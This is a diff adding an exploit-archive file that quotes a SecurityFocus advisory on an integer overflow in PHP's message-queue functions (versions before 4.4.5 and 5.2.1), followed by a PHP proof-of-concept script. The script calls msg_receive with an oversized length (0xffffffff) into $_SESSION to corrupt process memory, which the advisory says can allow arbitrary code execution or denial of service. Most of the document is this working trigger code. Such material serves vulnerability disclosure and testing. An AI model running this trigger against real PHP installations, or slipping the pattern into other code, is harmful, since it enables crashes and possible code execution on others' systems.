@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/23236/info
+
+PHP is prone to an integer-overflow vulnerability because it fails to ensure that integer values aren't overrun. Attackers may exploit this issue to cause a buffer overflow and to corrupt process memory.
+
+Exploiting this issue may allow attackers to execute arbitrary machine code in the context of the affected application. Failed exploit attempts will likely result in a denial-of-service condition.
+
+This issue affects PHP versions prior to 4.4.5 and 5.2.1. 
+
+<?php
+
+  $MSGKEY = 519052;
+
+  $msg_id = msg_get_queue ($MSGKEY, 0600);
+
+  if (!msg_send ($msg_id, 1, 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH', false, true, $msg_err))
+    echo "Msg not sent because $msg_err\n";
+
+  if (msg_receive ($msg_id, 1, $msg_type, 0xffffffff, $_SESSION, false, 0, $msg_error)) {
+    echo "$msg\n";
+  } else {
+    echo "Received $msg_error fetching message\n";
+    break;
+  }
+
+  msg_remove_queue ($msg_id);
+
+?>
